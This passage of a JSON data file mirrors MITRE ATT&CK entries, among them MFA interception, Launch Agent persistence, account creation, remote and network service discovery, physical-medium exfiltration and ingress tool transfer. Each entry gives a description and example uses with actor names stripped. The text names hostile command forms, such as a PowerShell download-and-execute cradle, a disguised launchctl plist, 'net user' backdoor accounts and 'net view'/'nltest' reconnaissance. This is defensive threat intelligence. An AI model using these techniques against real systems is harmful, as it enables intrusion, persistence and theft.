    "description": "Adversaries may target multi-factor authentication (MFA) mechanisms, (i.e., smart cards, token generators, etc.) to gain access to credentials that can be used to access systems, services, and network resources. Use of MFA is recommended and provides a higher level of security than usernames and passwords alone, but organizations should be aware of techniques that could be used to intercept and bypass these security mechanisms. If a smart card is used for multi-factor authentication, then a keylogger will need to be used to obtain the password associated with a smart card during normal use. With both an inserted card and access to the smart card password, an adversary can connect to a network resource using the infected system to proxy the authentication with the inserted hardware token. (Citation: Mandiant M Trends 2011)Adversaries may also employ a keylogger to similarly target other hardware tokens, such as RSA SecurID. Capturing token input (including a user's personal identification code) may provide temporary access (i.e. replay the one-time passcode until the next value rollover) as well as possibly enabling adversaries to reliably predict future authentication values (given access to both the algorithm and any seed values used to generate appended temporary codes). (Citation: GCN RSA June 2011)Other methods of MFA may be intercepted and used by an adversary to authenticate. It is common for one-time codes to be sent via out-of-band communications (email, SMS). If the device and/or service is not secured, then it may be vulnerable to interception. Service providers can also be targeted: for example, an adversary may compromise an SMS messaging service in order to steal MFA codes sent to users phones.(Citation: Okta Scatter Swine 2022)",
    "example_uses": [
      "is known to contain functionality that enables targeting of smart card technologies to proxy authentication for connections to restricted network resources using detected hardware tokens.",
      "can log credentials on compromised Pulse Secure VPNs during the `DSAuth::AceAuthServer::checkUsernamePassword`ACE-2FA authentication procedure.",
      "During  threat actors used a custom collection method to intercept two-factor authentication soft tokens.",
      "has used a proprietary tool to intercept one time passwords required for two-factor authentication.",
      "has registered alternate phone numbers for compromised users to intercept 2FA codes sent via SMS.",
      "has replayed stolen session token and passwords to trigger simple-approval MFA prompts in hope of the legitimate user will grant necessary approval.",
      "abused compromised appliance access to collect multifactor authentication token values during .",
      "has intercepted SMS-based one-time passwords and has set up two-factor authentication. Additionally  has used cloned or fake websites to capture MFA tokens."
    ],
    "id": "T1111",
    "name": "Multi-Factor Authentication Interception",
    "similar_words": [
      "Two-Factor Authentication Interception",
      "Multi-Factor Authentication Interception"
    ]
  },
  "attack-pattern--dd901512-6e37-4155-943b-453e3777b125": {
    "description": "Per Apple’s developer documentation, when a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (plist) files found in /System/Library/LaunchAgents, /Library/LaunchAgents, and $HOME/Library/LaunchAgents (Citation: AppleDocs Launch Agent Daemons) (Citation: OSX Keydnap malware) (Citation: Antiquated Mac Malware). These launch agents have property list files which point to the executables that will be launched (Citation: OSX.Dok Malware).\n \nAdversaries may install a new launch agent that can be configured to execute at login by using launchd or launchctl to load a plist into the appropriate directories  (Citation: Sofacy Komplex Trojan)  (Citation: Methods of Mac Malware Persistence). The agent name may be disguised by using a name from a related operating system or benign software. Launch Agents are created with user level privileges and are executed with the privileges of the user when they log in (Citation: OSX Malware Detection) (Citation: OceanLotus for OS X). They can be set up to execute when a specific user logs in (in the specific user’s directory structure) or when any user logs in (which requires administrator privileges).",
    "example_uses": [
      "persists via a Launch Agent.",
      "persists via a Launch Agent.",
      "persists via a Launch Agent.",
      "adds a .plist file to the /Library/LaunchAgents folder to maintain persistence.",
      "creates a Launch Agent on macOS.",
      "persists via a Launch Agent.",
      "uses a Launch Agent to persist.",
      "The  trojan creates a persistent launch agent called with $HOME/Library/LaunchAgents/com.apple.updates.plist with launchctl load -w ~/Library/LaunchAgents/com.apple.updates.plist."
    ],
    "id": "T1159",
    "name": "Launch Agent",
    "similar_words": [
      "Launch Agent"
    ]
  },
  "attack-pattern--e01be9c5-e763-4caf-aeb7-000b416aef67": {
    "description": "Adversaries may create an account to maintain access to victim systems.(Citation: Symantec WastedLocker June 2020) With a sufficient level of access, creating such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.Accounts may be created on the local system or within a domain or cloud tenant. In cloud environments, adversaries may create accounts that only have access to specific services, which can reduce the chance of detection.",
    "example_uses": [
      "used a tool called Imecab to set up a persistent remote access account on the victim machine.",
      "can create a Windows account.",
      "created accounts on victims, including administrator accounts, some of which appeared to be tailored to each individual staging target.",
      "has the capability to add its own account to the victim's machine.",
      "can user PowerView to perform “net user” commands and create local system and domain accounts.",
      "has been known to create or enable accounts, such as support_388945a0.",
      "The net user username \\password and net user username \\password \\domain commands in  can be used to create a local or domain account respectively.",
      "can create backdoor accounts with the login \"HelpAssistant\" with the Limbo module.",
      "may create a temporary user on the system named “Lost_{Unique Identifier}.”",
      "may create a temporary user on the system named “Lost_{Unique Identifier}” with the password “pond~!@6”{Unique Identifier}.”",
      "used wmic.exe to add a new user to the system.",
      "During the   added a login to a SQL Server with `sp_addlinkedsrvlogin`.",
      "creates new user identities within the compromised organization.",
      "has been observed creating accounts for persistence using simple names like a.",
      "has created Linux-level users on compromised network devices through modification of `/etc/shadow` and `/etc/passwd`."
    ],
    "id": "T1136",
    "name": "Create Account",
    "similar_words": [
      "Create Account"
    ]
  },
  "attack-pattern--e2907cea-4b43-4ed7-a570-0fdf0fbeea00": {
    "description": "Adversaries can hide a program's true filetype by changing the extension of a file. With certain file types (specifically this does not work with .app extensions), appending a space to the end of a filename will change how the file is processed by the operating system. For example, if there is a Mach-O executable file called evil.bin, when it is double clicked by a user, it will launch Terminal.app and execute. If this file is renamed to evil.txt, then when double clicked by a user, it will launch with the default text editing application (not executing the binary). However, if the file is renamed to \"evil.txt \" (note the space at the end), then when double clicked by a user, the true file type is determined by the OS and handled appropriately and the binary will be executed (Citation: Mac Backdoors are back). \n\nAdversaries can use this feature to trick users into double clicking benign-looking files of any format and ultimately executing something malicious.",
    "example_uses": [
      "puts a space after a false .jpg extension so that execution actually goes through the Terminal.app program."
    ],
    "id": "T1151",
    "name": "Space after Filename",
    "similar_words": [
      "Space after Filename"
    ]
  },
  "attack-pattern--e358d692-23c0-4a31-9eb6-ecc13a8d7735": {
    "description": "Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  [Ping](https://attack.mitre.org/software/S0097), net view using [Net](https://attack.mitre.org/software/S0039), or, on ESXi servers, `esxcli network diag ping`.Adversaries may also analyze data from local host files (ex: C:\\Windows\\System32\\Drivers\\etc\\hosts or /etc/hosts) or other passive means (such as local [Arp](https://attack.mitre.org/software/S0099) cache entries) in order to discover the presence of remote systems in an environment.Adversaries may also target discovery of network infrastructure as well as leverage [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands on network devices to gather detailed information about systems within a network (e.g. show cdp neighbors, show arp).(Citation: US-CERT-TA18-106A)(Citation: CISA AR21-126A FIVEHANDS May 2021)  ",
    "example_uses": [
      "collects a list of available servers with the command net view.",
      "used Microsoft’s Sysinternals tools to gather detailed information about remote systems.",
      "has used network scanning and enumeration tools, including .",
      "has used the net view command.",
      "has used ping to identify other machines of interest.",
      "likely obtained a list of hosts in the victim environment.",
      "runs the net view /domain and net view commands.",
      "uses the net view command for discovery.",
      "runs the net view command",
      "has the capability to identify remote hosts on connected networks.",
      "uses  and other Active Directory utilities to enumerate hosts.",
      "has a tool that can detect the existence of remote systems.",
      "has used the open source tool Essential NetTools to map the network and build a list of targets.",
      "typically use ping and  to enumerate systems.",
      "performs a connection test to discover remote systems in the network",
      "can be used to identify remote systems within a network.",
      "can ping or traceroute a remote host.",
      "uses scripts to enumerate IP ranges on the victim network.  has also issued the command net view /domain to a  implant to gather information about remote systems on the network.",
      "Commands such as net view can be used in  to gather information about available remote systems.",
      "may use net view /domain to display hostnames of available systems on a network.",
      "has a command to list all servers in the domain, as well as one to locate domain controllers on a domain.",
      "uses the native Windows Network Enumeration APIs to interrogate and discover targets in a Windows Active Directory network.",
      "scans the C-class subnet of the IPs on the victim's interfaces.",
      "used publicly available tools (including Microsoft's built-in SQL querying tool, osql.exe) to map the internal network and conduct reconnaissance against Active Directory, Structured Query Language (SQL) servers, and NetBIOS.",
      "surveys a system upon check-in to discover remote systems on a local network using the net view and net view /DOMAIN commands.",
      "The  command and execution module can perform target system enumeration.",
      "can enumerate Azure AD systems and devices.",
      "can use net view to discover remote systems.",
      "can identify remote systems through the net view command.",
      "During  the threat actors used the `net view` and `ping` commands as part of their advanced reconnaissance.",
      "During  threat actors used `nbtscan` and `ping` to discover remote systems as well as `dsquery subnet` on a domain controller to retrieve all subnets in the Active Directory.",
      "has used Angry IP Scanner to detect remote systems.",
      "can use net view to gather information about remote systems.",
      "can enumerate remote systems using Net View.",
      "can use a PowerShell object such as `System.Net.NetworkInformation.Ping` to ping a computer.",
      "can broadcasts NetBIOS Name Service (NBNC) messages to search for servers connected to compromised networks.",
      "has used a netbios scanner for remote machine identification.",
      "used the command powershell Get-EventLog -LogName security -Newest 500 | where {$_.EventID -eq 4624} | format-list -property * | findstr Address to find the network information of successfully logged-in accounts to discovery addresses of other machines.  has also used multiple scanning tools to discover other machines within the same compromised network.",
      "can use LDAP queries to connect to AD and iterate over connected workstations.",
      "During  the threat actors used several tools and batch files to map victims' internal networks.",
      "has used multiple methods including  to enumerate systems on compromised networks.",
      "has used a tool to query Active Directory using LDAP discovering information about computers listed in AD.",
      "can identify remote hosts on connected networks.",
      "can enumerate remote computers in the compromised network.",
      "uses software such as Advanced IP Scanner and MASSCAN to identify remote hosts within victim networks.",
      "During the   remotely discovered systems over LAN connections. OT systems were visible from the IT network  as well giving adversaries the ability to discover operational assets.",
      "has used network scanning and enumeration tools including .",
      "can discover active IP addresses along with the machine name within a targeted network.",
      "used Nmap for remote system discovery.",
      "has used `net view` to enumerate domain machines.",
      "uses the net view command on the victims machine.",
      "can collect information about hosts on the victim network.",
      "During the   used  to enumerate remote systems.",
      "scans its local network segment for remote systems to try to exploit and copy itself to.",
      "can enumerate and collect the properties of domain computers.",
      "can enumerate and collect the properties of domain computers including domain controllers.",
      "can search for other machines connected to compromised host and attempt to map the network.",
      "has been used to execute net view on a targeted system.",
      "has used `ping %REMOTE_HOST%` for post exploit discovery.",
      "can find machines on the local network by gathering known local IP addresses through `DNSGetCacheDataTable` `GetIpNetTable``WNetOpenEnumW(RESOURCE_GLOBALNET RESOURCETYPE_ANY)``NetServerEnum``GetTcpTable` and `GetAdaptersAddresses.`",
      "has used  and custom tools to discover remote systems.",
      "has the ability to discover hosts on a target network.",
      "has a command to list all servers in the domain as well as one to locate domain controllers on a domain.",
      "has enumerated DC servers using the command net group Domain Controllers /domain. The group has also used the ping command.",
      "has used Nmap to scan the corporate network build a network topology and identify vulnerable hosts.",
      "uses the net view command.",
      "has used a script to parse files like /etc/hosts and SSH known_hosts to discover remote systems.",
      "used publicly available tools (including Microsoft's built-in SQL querying tool osql.exe) to map the internal network and conduct reconnaissance against Active Directory Structured Query Language (SQL) servers and NetBIOS.",
      "can use the ARP table to find remote hosts to scan.",
      "can enumerate computers and network devices.",
      "has used PowerView to enumerate all Windows Server Windows Server 2003 and Windows 7 instances in the Active Directory database.",
      "can identify payment systems payment gateways and ATM systems in compromised environments.",
      "surveys a system upon check-in to discover remote systems on a local network using the net view and net view /DOMAIN commands.  has also used net group Domain Computers /domain net group Domain Controllers /domain and net group Exchange Servers /domain to enumerate domain computers including the organization's DC and Exchange Server.",
      "can be used to display a host's ARP cache which may include address resolutions for remote systems.",
      "can list NetBIOS computer names.",
      "has looked for IP addresses in the known_hosts file on the infected system and attempted to SSH into them.",
      "used Microsofts Sysinternals tools to gather detailed information about remote systems.",
      "uses  to enumerate all systems in the network.",
      "has used  for discovery on targeted networks.",
      "may be used to enumerate remote domain controllers using options such as /dclist and /dsgetdc.",
      "can enumerate remote systems such as VMware vCenter infrastructure.",
      "has utilized various scans and queries to find domain controllers and remote services in the target environment.",
      "During the   checked for connectivity to resources within the network and used LDAP to query Active Directory discovering information about computers listed in AD.",
      "has enumerated domain controllers using `net group Domain computers` and `nltest /dclist`.",
      "has used networkdll for network discovery and psfin specifically for financial and point of sale indicators.  has also used  nltest/dclist and PowerShell script Get-DataInfo.ps1 to enumerate domain computers including the domain controller.",
      "has the ability to query Active Directory for computers.",
      "During  the threat actors used the commands `net view /all /domain` and `ping` to discover remote systems. They also used PowerView's PowerShell Invoke-ShareFinder script for file share enumeration.",
      "used a modified version of  to identify available NetBIOS name servers over the network as well as ping to identify remote systems.",
      "has used  and other Active Directory utilities to enumerate hosts; they have also used nltest.exe /dclist to retrieve a list of domain controllers.",
      "can enumerate and map ICS-specific systems in victim environments.",
      "has likely obtained a list of hosts in the victim environment.",
      "has used tools such as Nmap and MASSCAN for remote service discovery.",
      "used the tool  to scan for remote accessible hosts in victim environments.",
      "has used MiPing to discover active systems in the victim network.",
      "has used tools such as   and  to enumerate shares and hostnames on compromised networks.",
      "includes modules for performing ARP scans of local connected systems.",
      "can use `ping` to identify remote hosts within the victim network.",
      "performed extensive remote host enumeration to build their own map of victim networks during .",
      "probes arbitrary network endpoints for TCP connectivity.",
      "can enumerate all accessible machines from the infected system.",
      "has used  to identify remote systems.",
      "used tools such as  to identify remotely-connected devices."
    ],
    "id": "T1018",
    "name": "Remote System Discovery",
    "similar_words": [
      "Remote System Discovery"
    ]
  },
  "attack-pattern--e3a12395-188d-4051-9a16-ea8e14d07b88": {
    "description": "Adversaries may attempt to get a listing of services running on remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation. Common methods to acquire this information include port, vulnerability, and/or wordlist scans using tools that are brought onto a system.(Citation: CISA AR21-126A FIVEHANDS May 2021)   Within cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.Within macOS environments, adversaries may use the native Bonjour application to discover services running on other macOS hosts within a network. The Bonjour mDNSResponder daemon automatically registers and advertises a hosts registered services on the network. For example, adversaries can use a mDNS query (such as dns-sd -B _ssh._tcp .) to find other systems broadcasting the ssh service.(Citation: apple doco bonjour description)(Citation: macOS APT Activity Bradley)",
    "example_uses": [
      "scanned network services to search for vulnerabilities in the victim system.",
      "has used the publicly available tool SoftPerfect Network Scanner as well as a custom tool called GOLDIRONY to conduct network scanning.",
      "leveraged an open-source tool called SoftPerfect Network Scanner to perform network scanning.",
      "can scan for open TCP ports on the target network.",
      "has the capability to scan for open ports on hosts in a connected network.",
      "has a built-in module for port scanning.",
      "has used tcping.exe, similar to , to probe port status on systems of interest.",
      "has conducted port scans on a host.",
      "scans to identify open ports on the victim.",
      "can perform port scans from an infected host.",
      "is capable of probing the network for open ports.",
      "has a plugin that can perform ARP scanning as well as port scanning.",
      "the victim's internal network for hosts with ports 8080, 5900, and 40 open.",
      "used publicly available tools (including Microsoft's built-in SQL querying tool, osql.exe) to map the internal network and conduct reconnaissance against Active Directory, Structured Query Language (SQL) servers, and NetBIOS.",
      "actors use the Hunter tool to conduct network service discovery for vulnerable systems.",
      "has used  and a custom port scanner known as BLUETORCH for network scanning.",
      "During  the threat actors employed nmap and pscan to scan target environments.",
      "has used the SNScan tool to find other potential targets on victim networks.",
      "has used tcping.exe similar to  to probe port status on systems of interest.",
      "can use a network scanning module to identify ICS-related ports.",
      "uses a custom port scanner to map out a network.",
      "has utilized `nmap` for reconnaissance efforts.  has also scanned for internal MS-SQL servers in a compromised network.",
      "can scan for systems that are vulnerable to the EternalBlue exploit.",
      "performed port scanning to obtain the list of active services.",
      "has used nmap from a router VM to scan ports on systems within the restricted segment of an enterprise network.",
      "can scan the network interfaces of targeted systems.",
      "checks for availability of specific ports on servers.",
      "has used masscan to look for kubelets in the internal Kubernetes network.",
      "used pr and an openly available tool to scan for open ports on target systems.",
      "has used the LadonGo scanner to scan target networks.",
      "has used KPortScan 3.0 to perform SMB RDP and LDAP scanning.",
      "conducted scanning for exposed TCP port 7001 as well as SSH and Redis servers.",
      "During  used RustScan to scan for open ports on targeted ESXi appliances.",
      "can be used to scan IP networks.",
      "performed network scanning on the network to search for open ports services OS finger-printing and other vulnerabilities.",
      "can initiate a port scan against a given IP address.",
      "can check for open ports on a computer by establishing a TCP connection.",
      "can launch port scans.",
      "server component can spider authentication portals.",
      "During  the threat actors used the SoftPerfect Network Scanner for network scanning.",
      "has used the get -b <start ip> -e <end ip> -p command for network scanning as well as a custom Python tool packed into a Windows executable named Get.exe to scan IP ranges for HTTP.",
      "can scan for open ports on a compromised machine.",
      "used a malware variant called WIDETONE to conduct port scans on specified subnets.",
      "can perform port scanning of TCP and UDP ports.",
      "the victim's internal network for hosts with ports 8080 5900 and 40 open.",
      "can conduct port scanning against targeted systems.",
      "can scan networks for open ports and listening services.",
      "has the ability to scan ports on a compromised network.",
      "used publicly available tools (including Microsoft's built-in SQL querying tool osql.exe) to map the internal network and conduct reconnaissance against Active Directory Structured Query Language (SQL) servers and NetBIOS.",
      "has used masscan to search for open Docker API ports and Kubernetes clusters.  has also used malware that utilizes zmap and zgrab to search for vulnerable services in cloud environments.",
      "During  threat actors scanned for open ports and used nbtscan to find NETBIOS nameservers.",
      "has used SMBTouch a vulnerability scanner to determine whether a target is vulnerable to EternalBlue malware.",
      "scans for other machines to infect.",
      "has used tools including NMAP to conduct broad scanning to identify open ports.",
      "can scan the network for open ports and vulnerable instances of RDP and SMB protocols.",
      "can scan for open ports including TCP ports 135 and 1433.",
      "has a module to use a port scanner on a system.",
      "can perform network reconnaissance using the Advanced Port Scanner tool.",
      "has used commercial tools LOTL utilities and appliances already present on the system for network service discovery.",
      "used the open-source port scanner WinEggDrop to perform detailed scans of hosts of interest in victim networks.",
      "During  threat actors executed the Advanced Port Scanner tool on compromised systems.",
      "has used NETSCAN.EXE for internal reconnaissance.",
      "As part of load balancing  can set `healthCheck.type = tcp` or `healthCheck.type = http` to check service status on specific hosts with TCPing or an HTTP request.",
      "includes modules for performing HTTP and server service scans.",
      "has used netstat to check if port 4119 is open.",
      "has used tools such as NMAP for remote system discovery and enumeration in victim environments.",
      "has used tools such as NetScan to enumerate network services in victim environments.",
      "identifies remote systems via active directory queries for hostnames prior to launching remote ransomware payloads.",
      "To collect data on the host's Wi-Fi connection history  reads the `/Library/Preferences/SystemConfiguration/com.apple.airport.preferences.plist file`.It also utilizes Apple's CWWiFiClient API to scan for nearby Wi-Fi networks and obtain data on the SSID security type and RSSI (signal strength) values.",
      "has used port scanners to enumerate services on remote hosts."
    ],
    "id": "T1046",
    "name": "Network Service Discovery",
    "similar_words": [
      "Network Service Scanning",
      "Network Service Discovery"
    ]
  },
  "attack-pattern--e6415f09-df0e-48de-9aba-928c902b7549": {
    "description": "Adversaries may attempt to exfiltrate data via a physical medium, such as a removable drive. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a physical medium or device introduced by a user. Such media could be an external hard drive, USB drive, cellular phone, MP3 player, or other removable storage and processing device. The physical medium or device could be used as the final exfiltration point or to hop between otherwise disconnected systems.",
    "example_uses": [
      "creates a file named thumb.dd on all USB flash drives connected to the victim. This file contains information about the infected system and activity logs.",
      "contains a module to move data from airgapped networks to Internet-connected systems by using a removable USB device.",
      "copies staged data to removable drives when they are inserted into the system.",
      "exfiltrates collected files via removable media from air-gapped victims."
    ],
    "id": "T1052",
    "name": "Exfiltration Over Physical Medium",
    "similar_words": [
      "Exfiltration Over Physical Medium"
    ]
  },
  "attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add": {
    "description": "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp](https://attack.mitre.org/software/S0095). Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570)). On Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, [certutil](https://attack.mitre.org/software/S0160), and [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands such as IEX(New-Object Net.WebClient).downloadString() and Invoke-WebRequest. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.(Citation: t1105_lolbas)  A number of these tools, such as `wget`, `curl`, and `scp`, also exist on ESXi. After downloading a file, a threat actor may attempt to verify its integrity by checking its hash value (e.g., via `certutil -hashfile`).(Citation: Google Cloud Threat Intelligence COSCMICENERGY 2023)Adversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by [User Execution](https://attack.mitre.org/techniques/T1204) (typically after interacting with [Phishing](https://attack.mitre.org/techniques/T1566) lures).(Citation: T1105: Trellix_search-ms)Files can also be transferred using various [Web Service](https://attack.mitre.org/techniques/T1102)s as well as native or otherwise present tools on the victim system.(Citation: PTSecurity Cobalt Dec 2016) In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.(Citation: Dropbox Malware Sync)",
    "example_uses": [
      "malware can download additional files from C2 servers.",
      "can download remote files onto victims.",
      "has downloaded additional malware, including by using .",
      "can download additional components from the C2 server.",
      "can download files remotely.",
      "downloads a new version of itself once it has installed. It also downloads additional plugins.",
      "can download and execute files.",
      "has a command to download and executes additional files.",
      "has used shellcode to download Meterpreter after compromising a victim.",
      "retrieves additional malicious payloads from the C2 server.",
      "uploads files and secondary payloads to the victim's machine.",
      "can download files from the C2 server to the victim’s machine.",
      "downloads several additional files and saves them to the victim's machine.",
      "downloads additional files from C2 servers.",
      "can download files from its C2 server to the victim's machine.",
      "has the capability to download files to execute on the victim’s machine.",
      "has the capability to upload and download files to the victim's machine.",
      "downloads additional plug-ins to load on the victim’s machine, including the ability to upgrade and replace its own binary.",
      "can download and launch additional payloads.",
      "can download and execute a file from given URL.",
      "has downloaded and executed additional plugins.",
      "can download and upload files to and from the victim’s machine.",
      "can upload and download files to the victim.",
      "can download files to the victim’s machine and execute them.",
      "uploads and downloads information.",
      "uses public sites such as github.com and sendspace.com to upload files and then download them to victim computers.",
      "uploads and downloads files to and from the victim’s machine.",
      "downloads and uploads files to and from the victim’s machine.",
      "can upload files to the victim's machine for operations.",
      "obtains additional code to execute on the victim's machine.",
      "can download and upload files to the victim's machine.",
      "copied and installed tools for operations once in the victim environment.",
      "can upload files to the victim’s machine and can download additional payloads.",
      "can download additional files.",
      "downloads and uploads files on the victim’s machine.",
      "creates a backdoor through which remote attackers can upload files.",
      "can upload and download files to the victim’s machine.",
      "has downloaded second stage malware from compromised websites.",
      "The Ritsol backdoor trojan used by  can download files onto a compromised host from a remote location.",
      "can download files and upgrade itself.",
      "can retrieve and execute additional  payloads from the C2 server.",
      "can download remote files.",
      "can download files onto the victim.",
      "can download additional payloads onto the victim.",
      "downloads additional payloads.",
      "is capable of downloading additional files.",
      "creates a backdoor through which remote attackers can download files.",
      "has transferred files using the Intel® Active Management Technology (AMT) Serial-over-LAN (SOL) channel.",
      "can upload and download files.",
      "can be used to create  to upload and/or download files.",
      "has downloaded additional scripts and files from adversary-controlled servers.  has also used an uploader known as LUNCHMONEY that can exfiltrate files to Dropbox.",
      "has used remote code execution to download subsequent payloads.",
      "can download additional files from URLs.",
      "creates a backdoor through which remote attackers can download files and additional malware components.",
      "can download and execute a second-stage payload.",
      "can upload and download files, including second-stage malware.",
      "creates a backdoor through which remote attackers can download files onto a compromised host.",
      "can download additional files and payloads to compromised hosts.",
      "can upload and download to/from a victim machine.",
      "can download and execute an arbitary executable.",
      "creates a backdoor through which remote attackers can upload files.",
      "downloads files onto infected hosts.",
      "can download files.",
      "creates a backdoor through which remote attackers can download files onto compromised hosts.",
      "can execute a task to download a file.",
      "has downloaded additional code and files from servers onto victims.",
      "has a tool that can copy files to remote machines.",
      "has added JavaScript to victim websites to download additional frameworks that profile and compromise website visitors.",
      "can download remote files.",
      "can download or upload files from its C2 server.",
      "can download files from remote servers.",
      "has used various tools to download files, including DGet (a similar tool to wget).",
      "can download remote files onto victims.",
      "can download additional files.",
      "has a command to download and execute an additional file.",
      "can download remote files and additional payloads to the victim's machine.",
      "copies a file over to the remote system before execution.",
      "is capable of downloading files, including additional modules.",
      "has a command to upload a file to the victim machine.",
      "can download additional files.",
      "can upload, download, and execute files on the victim.",
      "is capable of downloading remote files.",
      "is capable of downloading additional files.",
      "can be used to copy files to a remotely connected system.",
      "has deployed Meterpreter stagers and SplinterRAT instances in the victim network after moving laterally.",
      "is capable of downloading additional files through C2 channels, including a new version of itself.",
      "After downloading its main config file,  downloads multiple payloads from C2 servers.",
      "attempts to download an encrypted binary from a specified domain.",
      "uses the Dropbox API to request two files, one of which is the same file as the one dropped by the malicious email attachment. This is most likely meant to be a mechanism to update the compromised host with a new version of the  malware.",
      "contains a command to retrieve files from its C2 server.",
      "is capable of downloading files from the C2.",
      "has downloaded additional malware to execute on the victim's machine, including by using a PowerShell script to launch shellcode that retrieves an additional payload.",
      "is capable of performing remote file transmission.",
      "has installed updates and new malware on victims.",
      "is capable of writing a file to the compromised system from the C2 server.",
      "has a command to download a file from the C2 server to the victim mobile device's SD card.",
      "can download an executable to run on the victim.",
      "has the capability to download and execute .exe files.",
      "has a command to download a file.",
      "has the capability to download files from the C2 server.",
      "can retrieve an additional payload from its C2 server.",
      "downloads and executes additional malware from either a Web address or a Microsoft OneDrive account.",
      "has the ability to upload and download files from its C2 server.",
      "has been observed being used to download  and the Cobalt Strike Beacon payload onto victims.",
      "downloads and executes additional PowerShell code and Windows binaries.",
      "contains a command to download and execute a file from a remotely hosted URL using WinINet HTTP requests.",
      "can download and execute additional files.",
      "has the ability to download and execute additional files.",
      "is capable of downloading a file from a specified URL.",
      "can download additional encrypted backdoors onto the victim via GIF files.",
      "has a command to download a file to the system from its C2 server.",
      "downloads its backdoor component from a C2 server and loads it directly into memory.",
      "downloads another dropper from its C2 server.",
      "has the capability to download a file to the victim from the C2 server.",
      "can download and execute files.",
      "has the capability to download files.",
      "has the ability to download files.",
      "can be used to download files from a given URL.",
      "contains a network loader to receive executable modules from remote attackers and run them on the local victim. It can also upload and download files over HTTP and HTTPS.",
      "searches for network drives and removable media and duplicates itself onto them.",
      "is capable of uploading and downloading files.",
      "Tools used by  are capable of downloading and executing additional payloads.",
      "payloads download additional files from the C2 server.",
      "Several  malware families are capable of downloading and executing binaries from its C2 server.",
      "After re-establishing access to a victim network,  actors download tools including  and WCE that are staged temporarily on websites that were previously compromised but never used.",
      "has downloaded additional files, including by using a first-stage downloader to contact the C2 server to obtain the second-stage implant.",
      "has downloaded additional tools including  directly to endpoints.",
      "has downloaded additional Lua scripts from the C2.",
      "can load additional drivers and files onto a victim machine.",
      "can write malicious payloads sent through a web requests command parameter.",
      "can download additional packages for keylogging cryptocurrency mining and other capabilities; it can also retrieve malicious payloads such as  AsyncRat  RedLine  and Metasploit.",
      "has the ability to download additional payloads from C2 to the targeted system.",
      "has downloaded additional malware and tools onto a compromised host.",
      "can download additional files from its C2 via HTTP or DNS.",
      "can receive data and executable scripts from C2.",
      "has downloaded malware and tools--including Nishang and PowerCat--onto a compromised host.",
      "has used public sites such as github.com and sendspace.com to upload files and then download them to victim computers. The group's JavaScript backdoor is also capable of downloading files.",
      "downloads and uploads files on the victims machine.",
      "has used `curl` to download a  from a public facing adversary-controlled webpage.",
      "can download additional payloads from C2.",
      "has downloaded files including  to compromised hosts.",
      "has dropped payload and configuration files to disk.  has also been used to download and execute additional payloads.",
      "has the ability to download additional payloads onto an infected machine.",
      "has the ability to download files to the compromised host.",
      "has used a delivered trojan to download additional files.",
      "is designed to download an implant from a C2 server.",
      "can download additional payloads onto a compromised host.",
      "has the capability to download and activate additional modules for execution.",
      "has downloaded and dropped temporary files containing scripts; it additionally has a function to upload files from the victims machine.",
      "has downloaded files malware and tools from its C2 onto a compromised host.",
      "can download additional payloads.",
      "deploys additional backdoors and hacking tools to the system.",
      "has transferred files using the Intel Active Management Technology (AMT) Serial-over-LAN (SOL) channel.",
      "can download files to targeted systems via SMB.",
      "had the ability to download additional payloads.",
      "can download additional files from the C2 server for execution.",
      "has built-in commands for uploading downloading and executing files to the system.",
      "has used tools to download files to compromised machines.",
      "can download files from C2.",
      "has a command to download a file from and to a remote C2 server.",
      "can download and execute payloads on a target host.",
      "can download files to the victims machine.",
      "During  the threat actors downloaded malware and tools onto a compromised host.",
      "has the ability to download and execute files on a compromised host.",
      "uses HTTP GET requests to download other files that are executed in memory.",
      "has the ability to download additional tools from the C2.",
      "has downloaded additional files from the C2.",
      "can download and execute additional payloads on a compromised host.",
      "can load additional files and tools including .",
      "has the capability to download files to execute on the victims machine.",
      "has downloaded files to a victim machine.",
      "downloads and executes additional files from a remote server.",
      "can make a direct SQL connection to a Microsoft database controlled by the attackers retrieve an item from the bindata table then write and execute the file on disk.",
      "has delivered trojanized executables via spearphishing emails that contacts actor-controlled servers to download malicious payloads.",
      "has the ability to upload and download files to and from the infected host.",
      "has the ability to download files on an infected host.",
      "has the ability to upload and download files.",
      "has used malicious scripts and macros with the ability to download additional payloads.",
      "has downloaded additional scripts tools and malware onto victim systems.",
      "has the ability to download additional files for execution on the victim's machine.",
      "can download its second stage from a hardcoded URL within the loader's code.",
      "can download additional files onto the host.",
      "can save a new file to the system from the C2 server.",
      "downloads additional plug-ins to load on the victims machine including the ability to upgrade and replace its own binary.",
      "can download additional files onto a compromised host.",
      "obtains additional code to execute on the victim's machine including the downloading of a secondary payload.",
      "uses the Dropbox API to request two files one of which is the same file as the one dropped by the malicious email attachment. This is most likely meant to be a mechanism to update the compromised host with a new version of the  malware.",
      "can download additional modules from the C2 server.",
      "has downloaded additional scripts and files from adversary-controlled servers.",
      "During   downloaded multistage malware and tools onto a compromised host.",
      "can retrieve payloads from the C2 server.",
      "can download and execute remote files.",
      "can be used to copy files to/from a remotely connected external system.",
      "can download files to a compromised host.",
      "can download and execute additional payloads.",
